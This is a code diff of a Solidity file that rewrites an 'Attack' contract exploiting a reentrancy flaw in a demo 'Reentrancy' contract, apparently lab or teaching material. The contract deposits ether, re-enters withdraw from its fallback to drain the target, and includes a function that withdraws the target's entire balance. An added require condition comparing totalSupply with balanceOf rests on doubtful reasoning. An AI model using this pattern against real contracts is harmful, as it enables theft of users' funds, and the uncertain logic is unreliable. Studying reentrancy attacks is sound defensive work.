@@ -84,32 +84,34 @@ contract Reentrancy {
 
 
 contract Attack {
+    Reentrancy target;
 
-    Reentrancy private reentrancy;
-    address payable public owner;
+    constructor(address payable _target) public payable {
+        target = Reentrancy(_target);
+    }
 
-    constructor(address payable _reentrancy) public payable{
-        reentrancy = Reentrancy(_reentrancy);
-        owner = msg.sender;
+    function attack() external payable {
+        // First, we need to have some balance in the target contract
+        target.deposit.value(msg.value)();
+
+        // Then, we start the attack
+        target.withdraw(msg.value);
     }
 
     function () external payable {
-        reentrancy.withdraw(msg.value);
+        // target.totalSupply() != target.balanceOf(address(this))
+        // This is the condition that will make the attack work
+        require(target.totalSupply() != target.balanceOf(address(this)));
+        target.withdraw(msg.value);
         
     }
-
-    function attackreentrancy() public payable {
-        reentrancy.deposit.value(msg.value)();
-        reentrancy.withdraw(msg.value-1);
-
+    // get balance of the contract
+    function getBalance() public view returns (uint) {
+        return target.balanceOf(address(this));
     }
 
     function getBalanceRentrance() public payable {
-        reentrancy.withdraw(address(reentrancy).balance);
-        reentrancy.claim();
-    }
-
-    function getBalance() public view returns(uint) {
-        return address(this).balance;
+        target.withdraw(address(target).balance);
+        target.claim();
     }
 }
